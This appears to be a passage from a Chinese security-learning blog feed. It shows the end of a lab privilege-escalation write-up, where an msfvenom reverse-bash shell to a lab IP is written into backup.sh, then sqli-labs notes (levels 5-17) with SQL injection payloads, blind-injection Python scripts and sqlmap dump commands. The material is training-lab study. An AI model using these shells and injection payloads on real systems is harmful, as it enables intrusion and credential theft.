src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B749.JPG" srcset="/img/loading.gif" alt="picture"><br>接下来要拿下一个flag了，下一个是在root目录下的，那么现在权限肯定是不够的，所以下一步要提权了，但是我又不会提权，只能去找找别人是怎么做的了</p><p>提权好像需要用到这个backup.sh文件，网上的wp说用msfvenom脚本来打这个靶机，用的是reverse_bash这个payload来创建脚本，新开一个终端，输入命令：</p><pre><code class="hljs angelscript">msfvenom -p cmd/unix/reverse_bash lhost=<span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.101</span> lport=<span class="hljs-number">4455</span> R</code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B746.JPG" srcset="/img/loading.gif" alt="picture"><br>拿到了msfvenom帮我们自动生成的脚本，去写入backup.sh</p><pre><code class="hljs vim"><span class="hljs-keyword">echo</span> <span class="hljs-string">"0&lt;&amp;114-;exec 114&lt;&gt;/dev/tcp/192.168.56.101/4455;sh &lt;&amp;114 &gt;&amp;114 2&gt;&amp;114"</span> &gt; backup.<span class="hljs-keyword">sh</span></code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B747.JPG" srcset="/img/loading.gif" alt="picture"><br>然后，开一个新终端，创建一个舰艇亲，去监听之前脚本里指定的端口，然后执行一下backup.sh文件 等一会，我们就提权成功了，获得了root权限，然后用python语句进入root的shell</p><pre><code class="hljs swift">idpython3 -<span class="hljs-built_in">c</span> '<span class="hljs-keyword">import</span> pty;pty.spawn("/bin/bash")'</code></pre><p>然后去查看root目录下的flag.txt就行了<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B748.JPG" srcset="/img/loading.gif" alt="picture"><br>拿到第二个flag:6a347b975dd18ae6497c   大功告成！！</p>]]></content>
    
    
    <categories>
      
      <category>渗透实战</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sql注入笔记2（sqli-labs  5-30）</title>
    <link href="/2019/11/29/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B02/"/>
    <url>/2019/11/29/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B02/</url>
    
    <content type="html"><![CDATA[<p>0x01  Less-5</p><p>先输入id=1’ and 1=1报错了，输入id=1’ and ‘1’=’1,有回显，但是没有回显具体内容，所以猜测是字符型的布尔盲注。<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B723.JPG" srcset="/img/loading.gif" alt="picture"><br>接下来就是猜库名<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B724.JPG" srcset="/img/loading.gif" alt="picture"><br>猜测出库名第一个字母为s，然后用同样的方法，猜测出，第二个字母为e，然后以此类推，得到库名security</p><pre><code class="hljs matlab">payload:?id=<span class="hljs-number">1</span>' and substr(database(),x,<span class="hljs-number">1</span>)=<span class="hljs-string">'xxx'</span><span class="hljs-comment">%23</span></code></pre><p>然后开始猜测表名，这个比较麻烦，首先猜有几个表<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B725.JPG" srcset="/img/loading.gif" alt="picture"><br>发现有四个表</p><pre><code class="hljs n1ql">payload:?id=1' and (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>())=x%<span class="hljs-number">23</span></code></pre><p>然后开始猜测每个表的名字，我们关键是要找一张users的表，因为一般这张表里有用户名和密码</p><pre><code class="hljs routeros">payload:?<span class="hljs-attribute">id</span>=1' <span class="hljs-keyword">and</span> substr((select table_name <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database() limit x,1),x,1)=<span class="hljs-string">'x'</span>%23</code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B722.JPG" srcset="/img/loading.gif" alt="picture"><br>搞了半天，发现第四张表是users，然后要开始猜字段名，方法跟猜表名差不多,输入</p><pre><code class="hljs cs">payload:?id=<span class="hljs-number">1'</span> <span class="hljs-function">and <span class="hljs-title">substr</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">'users'</span> limit x,<span class="hljs-number">1</span></span>),x,1)</span>=<span class="hljs-string">'x'</span>%<span class="hljs-number">23</span></code></pre><p>，通过改变x的值来猜测各个列名，找到username和password两个列，最后开始报字段名id=1’  and substr((select group_concat(username/password) from security.users limit x,1),x,1)=’xxx’%23，但是这实在是太麻烦了<br>于是我去网上找了个布尔盲注的脚本来：</p><pre><code class="hljs python"><span class="hljs-comment">#! -*- encoding:utf-8 -*-</span><span class="hljs-comment">#select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA 猜库名</span><span class="hljs-comment">#select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = 'xxx'猜表名</span><span class="hljs-comment">#select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = 'xxx' and TABLE_NAME = 'xxx'猜列名</span><span class="hljs-comment">#select group_concat(password/username) from xxx.xxx猜字段名</span><span class="hljs-keyword">import</span> requestsdic=<span class="hljs-string">'0123456789abcdefghijklmnopqrstuvwxyz,'</span>url=<span class="hljs-string">'http://localhost:8080/sqli-labs-master/Less-5/?id=1\' and '</span>string=<span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:        id=<span class="hljs-string">"substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = database() and TABLE_NAME = 'users' limit 0,1),&#123;0&#125;,1)=&#123;1&#125;--+"</span>.format(str(i),ascii(j))        <span class="hljs-comment">#print(id)</span>        url_get=(url+id)        <span class="hljs-comment">#print(url_get)</span>        r=requests.get(url_get)        <span class="hljs-keyword">if</span> <span class="hljs-string">"You"</span> <span class="hljs-keyword">in</span> r.text:            string+=j            print(string)print(string)</code></pre><p>参考博客<a href="https://uuzdaisuki.com/2018/04/22/python%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96sql%E7%9B%B2%E6%B3%A8/" target="_blank" rel="noopener">https://uuzdaisuki.com/2018/04/22/python%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96sql%E7%9B%B2%E6%B3%A8/</a><br>运行脚本，得到结果：<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B726.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B721.JPG" srcset="/img/loading.gif" alt="picture"><br>结果我看网上的wp发现，这道题好像不是考的不是布尔盲注，应该是报错注入！！关于什么是双注入查询，可以看看这篇文章:<a href="https://www.2cto.com/article/201303/192718.html" target="_blank" rel="noopener">https://www.2cto.com/article/201303/192718.html</a><br>简单来说就是count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来，通过构造双查询，使一个查询结果报错，另一个查询结果就会出现在报错信息中，具体做法是，多一个聚合函数<br>count(*)<br>暴库payload：</p><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1'union select count(*),1, concat((select database()),floor(rand()<span class="hljs-number">*2</span>)) as a <span class="hljs-keyword">from</span> information_schema.tables<span class="hljs-built_in"> group </span>by a%23</code></pre><p>由于rand()函数的存在，它是随机产生一个大于0 小于1的数，所以不一定会产生报错，有一定的随机性，所以可以多试几次，此外floor函数的作用是产生一个不大于表达式的最大整数<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B727.JPG" srcset="/img/loading.gif" alt="picture"><br>爆表名payload:</p><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1' union select count(*),1, concat((select concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database() limit x,1),floor(rand()<span class="hljs-number">*2</span>)) as a <span class="hljs-keyword">from</span> information_schema.tables<span class="hljs-built_in"> group </span>by a%23</code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B728.JPG" srcset="/img/loading.gif" alt="picture"><br>得到第四张表为users<br>爆破列名payload:</p><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1' union select count(*),1, concat((select column_name <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">'users'</span> limit x,1),floor(rand()<span class="hljs-number">*2</span>)) as a <span class="hljs-keyword">from</span> information_schema.tables<span class="hljs-built_in"> group </span>by a%23</code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B729.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B730.JPG" srcset="/img/loading.gif" alt="picture"><br>得到三，四列为username和password<br>爆字段payload:</p><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1' union select count(*),1, concat((select concat_ws(<span class="hljs-string">'['</span>,password,username) <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>limit x,1),floor(rand()<span class="hljs-number">*2</span>)) as a <span class="hljs-keyword">from</span> information_schema.tables<span class="hljs-built_in"> group </span>by a%23</code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B731.JPG" srcset="/img/loading.gif" alt="picture"></p><p>0X02 Less-6<br>    这关是基于双引号的字符注入，那方法和第五关一样就是用双引号去闭合即可，布尔盲注和双注入查询（报错注入）都可</p><p>0x03 Less-7<br>    是导出文件GET字符型注入，之前没有接触过，看了一下源码，发现sql语句变成了$sql=”SELECT * FROM users WHERE id=((‘$id’)) LIMIT 0,1”;<br>    看来需要’))去闭合，发现正确回显的内容跟前几题不一样<br>    <img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B754.JPG" srcset="/img/loading.gif" alt="picture">，提示Use outfile,那首先要了解一下，outfile是什么，可以看看这个<a href="https://www.runoob.com/mysql/mysql-database-export.html" target="_blank" rel="noopener">https://www.runoob.com/mysql/mysql-database-export.html</a><br>    大致语法就是 select ….. into outfile “路径”; 首先测试一下mysql上能不能执行，发现报错了，去百度了一下，应该是secure_file_priv，限制了路径，在mysql的my.ini文件中，在<br>    [mysql]下添加secure_file_priv=“”，表示可以导出到任意路径，之后应该就配置完了。可以试验一下<br>    <img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B759.JPG" srcset="/img/loading.gif" alt="picture"><br>    应该是配置成功了，接下来就能去做题了，先测试一下：</p><pre><code class="hljs lsl">?id=id=<span class="hljs-number">1</span>')) union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> into outfile <span class="hljs-string">"f://wamp64//www//1.php"</span>%<span class="hljs-number">23</span></code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B761.JPG" srcset="/img/loading.gif" alt="picture"><br>发现他居然报错了，这是怎么回事，但是我去www看发现确实生成了1.php，而且也写入了数据<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B760.JPG" srcset="/img/loading.gif" alt="picture"><br>于是去看了看源码，row为false就会显示该错误，查看源码可知时，执行这个select …. into outile时$row为空值，则显示该错误，但是我们的这个sql语句还是正确执行的<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B762.JPG" srcset="/img/loading.gif" alt="picture"><br>之后的步骤就和第一关一样了，不同的是我们把回显结果输出到了外部文件中<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B763.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B764.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B765.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B766.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B767.JPG" srcset="/img/loading.gif" alt="picture"></p><pre><code class="hljs cs">payload:id=<span class="hljs-number">1'</span>)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span> <span class="hljs-keyword">into</span> oufile <span class="hljs-string">"f://wamp64//www//2.txt"</span>%<span class="hljs-number">23</span>   <span class="hljs-meta">#拿库名</span>payload:id=<span class="hljs-number">1'</span>)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">group_concat</span>(<span class="hljs-params">table_name</span>)<span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=<span class="hljs-string">'security'</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">into</span> oufile <span class="hljs-string">"f://wamp64//www//3.txt"</span>%<span class="hljs-number">23</span>    <span class="hljs-meta">#列表名</span>payload:id=<span class="hljs-number">1'</span>)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">group_concat</span>(<span class="hljs-params">column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">'users'</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">into</span> oufile <span class="hljs-string">"f://wamp64//www//4.txt"</span>%<span class="hljs-number">23</span>      <span class="hljs-meta">#列列名</span>payload:id=<span class="hljs-number">1'</span>)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">group_concat</span>(<span class="hljs-params">password</span>) <span class="hljs-keyword">from</span> security.users) ,(<span class="hljs-params"><span class="hljs-keyword">select</span> group_concat(username</span>)),3 <span class="hljs-keyword">into</span> oufile "f:<span class="hljs-comment">//wamp64//www//5.txt"%23             #列username和password的字段</span></span></code></pre><p>此外这道题还可以，导出到php文件，那么就可以传一句话木马进去，然后可以连菜刀等连接wenshell的工具<br>0x04 Less-8<br>这道题应该就是布尔盲注没错了，和我之前第五题一开始的做法一样</p><p>0x05 Less-9<br>这道题是居于时间的盲注，为什么呢，因为你发现无论你提交什么语句，页面总是显示You are in …. 这一个页面而不会有其他变化，这样就要考虑基于时间的盲注了<br>在了解这之前我们要先了解一下mysql中的if语句:<br>if(exp1,exp2,exp3),如果exp1正确就执行exp2，如果exp1不正确那么则执行exp3<br>此外还要知道mysql中还有一个延时函数叫做sleep():sleep(n),暂停数据库n秒，根据上诉内容那么我们就可以构造这样的sql注入语句：<br>id=1’ and if(exp,sleep(5),0),如果exp这个语句是对的，数据库会暂停5秒，在网页上显示会等待响应一段时间，如果是错的就还是维持原页面，这样做法就和布尔盲注一样了，不同的是我们<br>要观察网页是否等待响应一段时间，从而来猜数据库的库名，表名，字段名<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B768.JPG" srcset="/img/loading.gif" alt="picture"><br>拿到了数据库的名字，然后会发现，爆表名列名时很麻烦，不过还好我们有基于时间注入的python脚本</p><pre><code class="hljs python"><span class="hljs-comment">#! -*- encoding:utf-8 -*-</span><span class="hljs-comment"># python3</span><span class="hljs-comment"># author: leticia</span><span class="hljs-comment">#select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA/database()</span><span class="hljs-comment">#select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = 'xxx'</span><span class="hljs-comment">#select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = 'xxx' and TABLE_NAME = 'xxx'</span><span class="hljs-comment">#select group_concat(xxx) from xxx.xxx</span><span class="hljs-keyword">import</span> requestsdic=<span class="hljs-string">'0123456789abcdefghijklmnopqrstuvwxyz,'</span>url=<span class="hljs-string">'http://localhost:8080/sqli-labs-master/Less-9/?id=1\' and '</span>string=<span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>):    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:        id=<span class="hljs-string">"if((substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),&#123;0&#125;,1)=&#123;1&#125;),sleep(5),0)--+"</span>.format(str(i),ascii(j))        <span class="hljs-comment">#print(id)</span>        url_get=(url+id)        <span class="hljs-comment">#print(url_get)</span>        r=requests.get(url_get)        sec=r.elapsed.seconds        <span class="hljs-keyword">if</span> sec &gt; <span class="hljs-number">2</span>:            string+=j            print(string)            <span class="hljs-keyword">break</span>print(string)</code></pre><p>和之前你基于布尔盲注的脚本类似，只是最后判断条件改了一下，判断响应是否大于三秒<br>脚本跑出来的结果：<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B770.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B771.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B772.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B773.JPG" srcset="/img/loading.gif" alt="picture"></p><p>0x06 Less-10<br>还是基于时间注入，只是改成用双引号去闭合</p><p>0x07 Less-11<br>说是字符串注入，试了一下万能密码:</p><pre><code class="hljs routeros"><span class="hljs-attribute">username</span>=1' <span class="hljs-keyword">or</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'1'</span>#</code></pre><p>密码随便输就行了<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B774.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B775.JPG" srcset="/img/loading.gif" alt="picture"><br>直接就登进去了，不过他只给了我一组用户名和密码，那怎么去拿到其他用户的呢，先抓个包<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B776.JPG" srcset="/img/loading.gif" alt="picture"><br>发现时post型注入，注入点应该在uname这里，之后的做法应该就跟第一题一样了，一步步的列出库名。表名，列名和字段名</p><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=1' union select 1,(select group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata) #&amp;<span class="hljs-attribute">passwd</span>=1  #列出所有库名<span class="hljs-attribute">uname</span>=1' union select 1,(select group_concat(table_name)<span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">'security'</span>) #&amp;<span class="hljs-attribute">passwd</span>=1  #列出security下的表名<span class="hljs-attribute">uname</span>=1' union select 1,(select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">'users'</span>) #&amp;<span class="hljs-attribute">passwd</span>=1    #列出users下的列名<span class="hljs-attribute">uname</span>=1' union select 1,(select group_concat(username/password) <span class="hljs-keyword">from</span> security.users) #&amp;<span class="hljs-attribute">passwd</span>=1         #爆破出用户名和密码</code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B777.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B778.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B779.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B780.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B781.JPG" srcset="/img/loading.gif" alt="picture"></p><p>0x08 Less-12<br>和十一题一样就是，用”)闭合</p><p>0x09 Less-13<br>感觉这道题和第五题有点类似，只是改成了post型，然后要用’)去闭合又是双注入查询，然后注入点肯定还是在uname这里。passwd填啥都行，跟第五题同样的方法:使一个查询结果报错，另一个查询结果就会出现在报错信息中</p><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=-1')union select count(*), concat((select database()),floor(rand()<span class="hljs-number">*2</span>)) as a <span class="hljs-keyword">from</span> information_schema.tables<span class="hljs-built_in"> group </span>by a#&amp;<span class="hljs-attribute">passwd</span>=1  #列出所有库名<span class="hljs-attribute">uname</span>=-1') union select count(*), concat((select concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database() limit x,1),floor(rand()<span class="hljs-number">*2</span>)) as a <span class="hljs-keyword">from</span> information_schema.tables<span class="hljs-built_in"> group </span>by a#&amp;<span class="hljs-attribute">passwd</span>=1  #列出security下的表名,式中的x表示你想得到第几个表的名字<span class="hljs-attribute">uname</span>=-1' union select count(*), concat((select column_name <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">'users'</span> limit x,1),floor(rand()<span class="hljs-number">*2</span>)) as a <span class="hljs-keyword">from</span> information_schema.tables<span class="hljs-built_in"> group </span>by a    #列出users下的列名，x表示你想爆第几列<span class="hljs-attribute">uname</span>=-1' union select count(*),1, concat((select concat_ws(<span class="hljs-string">'['</span>,password,username) <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>limit x,1),floor(rand()<span class="hljs-number">*2</span>)) as a <span class="hljs-keyword">from</span> information_schema.tables<span class="hljs-built_in"> group </span>by a#&amp;<span class="hljs-attribute">passwd</span>=1         #爆破出用户名和密码</code></pre><p>这里要注意一点好像从第十一题开始select的参数只有两个了，可以用1’) order by n#测试一下，发现n为3的时候回报错，所以我们select只能选两个参数了<br>结果：<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B782.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B783.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B784.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B785.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B786.JPG" srcset="/img/loading.gif" alt="picture"></p><p>0x09 Less-14<br>和13关一样，就是改成双引号去闭合</p><p>0x10 Less-15<br>这个应该是post类型的布尔盲注了，不过这里判断条件是login successfully还是failed</p><pre><code class="hljs pgsql">uname=<span class="hljs-keyword">admin</span><span class="hljs-string">'  and substr(database(),x,1)='</span>x<span class="hljs-string">'#&amp;passwd=1  #猜库名uname=admin'</span> <span class="hljs-keyword">and</span> substr((<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> x,<span class="hljs-number">1</span>),x,<span class="hljs-number">1</span>)=<span class="hljs-string">'x'</span>%<span class="hljs-number">23</span>  #猜表名uname=<span class="hljs-keyword">admin</span><span class="hljs-string">' and substr((select column_name from information_schema.columns where table_name='</span>users<span class="hljs-string">' limit x,1),x,1)='</span>x<span class="hljs-string">'#&amp;passwd=1    #猜列名uname=admin'</span> <span class="hljs-keyword">and</span> substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">password</span>/username) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users <span class="hljs-keyword">limit</span> x,<span class="hljs-number">1</span>),x,<span class="hljs-number">1</span>)         #猜出用户名和密码</code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B787.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B788.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B789.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B790.JPG" srcset="/img/loading.gif" alt="picture"><br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B791.JPG" srcset="/img/loading.gif" alt="picture"></p><p>0x11 Less-16<br>和上面那题一样的道理，改成用“）闭合即可</p><p>15-16题我觉得也可以试试sqlmap，正好没怎么用过，所以以15题为例，试了试sqlmap这个工具<br>首先由于是post类型，我们可以先抓个包，获取 HTTP 请求保存在post.txt中，让sqlmap自己去解析<br>1.爆库：</p><pre><code class="hljs css"><span class="hljs-selector-tag">python2</span> <span class="hljs-selector-tag">sqlmap</span><span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">-r</span> "<span class="hljs-selector-tag">post</span><span class="hljs-selector-class">.txt</span>" <span class="hljs-selector-tag">--dbs</span>    <span class="hljs-selector-id">#-r</span>:表示加载一个文件<span class="hljs-selector-class">.--dbs</span>:表示爆破库名</code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B792.JPG" srcset="/img/loading.gif" alt="picture"><br>2.爆破security下的表名：</p><pre><code class="hljs css"><span class="hljs-selector-tag">python2</span> <span class="hljs-selector-tag">sqlmap</span><span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">-r</span> "<span class="hljs-selector-tag">post</span><span class="hljs-selector-class">.txt</span>" <span class="hljs-selector-tag">-D</span> <span class="hljs-selector-tag">security</span> <span class="hljs-selector-tag">--tables</span>   <span class="hljs-selector-id">#-D</span>:库名 <span class="hljs-selector-tag">--tables</span>:表示爆破表名</code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B793.JPG" srcset="/img/loading.gif" alt="picture"><br>3.爆破users下的列名：</p><pre><code class="hljs routeros">python2 sqlmap.py -r <span class="hljs-string">"post.txt"</span> -D security -T<span class="hljs-built_in"> users </span>--columns   #-T:表名 --columns：表示爆破列名</code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B794.JPG" srcset="/img/loading.gif" alt="picture"><br>4.爆破username，password：</p><pre><code class="hljs routeros">python2 sqlmap.py -r <span class="hljs-string">"post.txt"</span> -D security -T<span class="hljs-built_in"> users </span>-C <span class="hljs-string">"username,password"</span> --dump   #-C:列名名 --dump：获取数据</code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B795.JPG" srcset="/img/loading.gif" alt="picture"><br>完事了</p><p>0x12 Less-17<br>这道题是update注入，是报错注入的一种，主要运用sql内置函数uodatexml<br>updatexml函数介绍：<br>1<br>2    UPDATEXML (XML_document, XPath_string, new_value);<br>3    第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>4    第二个参数：XPath_string (Xpath格式的字符串) 。<br>5    第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>而我们的报错注入主要针对第二个参数，假设注入语句为：updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)，concat不符合xpath的语法，出现格式错误，报错内容即为数据库的版本，完成注入<br>接下来，我们在题目中看看<br>首先提一下，这里我看了源码之后发现，它对uname做了一大堆过滤，但是没对passwd做什么处理，所以注入点在passwd这里<br>首先还是列出库名：</p><pre><code class="hljs nix">payload:<span class="hljs-attr">uanme=admin&amp;passwd=1'</span> <span class="hljs-literal">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,database(),<span class="hljs-number">0</span>x7e),<span class="hljs-number">3</span>)<span class="hljs-comment">#</span></code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7143.JPG" srcset="/img/loading.gif" alt="picture"><br>列出表名：</p><pre><code class="hljs sql">payload:uname=admin&amp;passwd=1' and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name)<span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span></code></pre><p>1<a href="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7144.JPG" target="_blank" rel="noopener">picture</a><br>列出列名：</p><pre><code class="hljs cs">payload:uname=admin&amp;passwd=<span class="hljs-number">1'</span> <span class="hljs-function">and <span class="hljs-title">updatexml</span>(<span class="hljs-params"><span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">'users'</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-meta">#</span></code></pre><p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7145.JPG" srcset="/img/loading.gif" alt="picture"><br>列出字段名：一开始，照之前的思路应该是：</p><pre><code class="hljs lisp">uname=admin&amp;passwd=1'and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span> group_concat(<span class="hljs-name">password</span>) from security.users),<span class="hljs-number">0</span>x7e),<span 